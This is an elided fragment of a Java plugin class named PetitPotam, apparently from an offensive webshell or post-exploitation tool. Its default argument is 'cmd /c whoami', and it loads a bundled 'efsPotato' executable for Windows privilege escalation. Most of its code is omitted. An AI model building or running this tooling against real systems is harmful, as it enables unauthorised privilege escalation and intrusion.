  ...
  implements Plugin
{
  ...
  public PetitPotam() {
    ...
    this.argsTextField = new JTextField(" cmd /c whoami ");
  ...
  private void runButtonClick(ActionEvent actionEvent) {
    ...
    byte[] pe = functions.readInputStreamAutoClose(PetitPotam.class.getResourceAsStream("assets/efsPotato-" + (this.payload.isX64() ? "64" : "32") + ".exe"));
